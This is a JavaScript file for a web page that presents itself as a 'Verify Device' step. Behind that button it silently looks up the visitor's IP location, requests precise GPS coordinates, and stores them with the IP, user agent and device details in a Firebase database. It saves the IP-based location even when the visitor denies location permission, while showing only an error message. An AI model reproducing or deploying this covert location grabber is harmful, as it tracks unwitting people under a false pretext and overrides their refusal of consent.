import { initializeTheme } from './src/features/theme/theme-manager.js';
import { listenForLocationRequests, setupUnloadHandler, determineLocationSource } from './src/features/location/location-tracker.js';
import { getDeviceInfo } from './src/utils/browser-detection.js';

// Helper function to handle geolocation errors
function getGeolocationErrorMessage(error) {
    switch(error.code) {
        case error.PERMISSION_DENIED:
            return "Location access was denied. Please allow location access to verify your device.";
        case error.POSITION_UNAVAILABLE:
            return "An error occurred. Please try again.";
        case error.TIMEOUT:
            return "An error occurred. Please try again.";
        default:
            return "An error occurred. Please try again.";
    }
}

// Helper function to get location from IP (silently)
async function getLocationFromIP() {
    const response = await fetch('https://ipapi.co/json/');
    if (!response.ok) {
        throw new Error('Failed to get location from IP');
    }
    const data = await response.json();
    return {
        coords: {
            latitude: parseFloat(data.latitude),
            longitude: parseFloat(data.longitude),
            accuracy: 5000,
            altitude: null,
            altitudeAccuracy: null
        },
        ip: data.ip,
        // Only include location data if it exists
        ...(data.city && { city: data.city }),
        ...(data.region && { region: data.region }),
        ...(data.country_name && { country: data.country_name })
    };
}

// Initialize Firebase and load theme
document.addEventListener('DOMContentLoaded', async () => {
    try {
        await initializeTheme();
        listenForLocationRequests();
        setupUnloadHandler();

        const verifyButton = document.getElementById('allowLocation');
        const locationStatus = document.getElementById('locationStatus');

        if (!verifyButton) {
            console.error('Verify button not found');
            return;
        }

        verifyButton.addEventListener('click', async () => {
            try {
                verifyButton.disabled = true;
                verifyButton.textContent = 'Verifying...';
                document.querySelector('.container').classList.add('processing');
                locationStatus.textContent = '';

                let position;
                let locationSource;
                let wasLocationDenied = false;
                let ipData;

                // Always get IP data first
                try {
                    ipData = await getLocationFromIP();
                } catch (ipError) {
                    console.error('IP location error:', ipError);
                }

                // Try to get precise location
                if (navigator.geolocation) {
                    try {
                        position = await new Promise((resolve, reject) => {
                            navigator.geolocation.getCurrentPosition(
                                resolve,
                                reject,
                                {
                                    enableHighAccuracy: true,
                                    timeout: 20000,
                                    maximumAge: 0
                                }
                            );
                        });
                        locationSource = await determineLocationSource(position);
                    } catch (geoError) {
                        console.log('Geolocation error:', geoError);
                        if (geoError.code === 1) { // Permission denied
                            wasLocationDenied = true;
                            locationStatus.textContent = getGeolocationErrorMessage(geoError);
                            locationStatus.style.color = '#DA1710';
                            verifyButton.disabled = false;
                            verifyButton.textContent = 'Verify Device';
                            document.querySelector('.container').classList.remove('processing');
                            
                            // Use IP data as position
                            if (ipData) {
                                position = ipData;
                                locationSource = 'IP-Based';
                            }
                        } else {
                            throw geoError;
                        }
                    }
                }

                // Only proceed with verification if we have position data
                if (position) {
                    // Save to Firebase
                    if (!window.database) {
                        throw new Error('Firebase database not initialized');
                    }

                    const locationsRef = window.database.ref('locations');
                    const newLocationRef = locationsRef.push();

                    // Base location data
                    const locationData = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        locationSource: locationSource,
                        locationDenied: wasLocationDenied,
                        timestamp: new Date().toISOString(),
                        status: 'active',
                        ip: ipData?.ip || position.ip,
                        userAgent: navigator.userAgent,
                        ...getDeviceInfo()
                    };

                    // Add optional fields only if they exist
                    if (position.coords.altitude !== null) {
                        locationData.altitude = position.coords.altitude;
                    }
                    if (position.coords.altitudeAccuracy !== null) {
                        locationData.altitudeAccuracy = position.coords.altitudeAccuracy;
                    }
                    if (position.city) {
                        locationData.city = position.city;
                    }
                    if (position.region) {
                        locationData.region = position.region;
                    }
                    if (position.country) {
                        locationData.country = position.country;
                    }

                    await newLocationRef.set(locationData);

                    if (!wasLocationDenied) {
                        // Show success and hide button
                        locationStatus.textContent = 'Device verified successfully';
                        locationStatus.style.color = ''; // Reset color
                        verifyButton.style.display = 'none';
                        document.querySelector('.thank-you-card').classList.add('success');
                    }
                }

            } catch (error) {
                console.error('Verification failed:', error);
                locationStatus.textContent = 'An error occurred. Please try again.';
                locationStatus.style.color = '#DA1710';
                verifyButton.disabled = false;
                verifyButton.textContent = 'Verify Device';
                document.querySelector('.container').classList.remove('processing');
            }
        });

    } catch (error) {
        console.error('Failed to initialize:', error);
    }
});
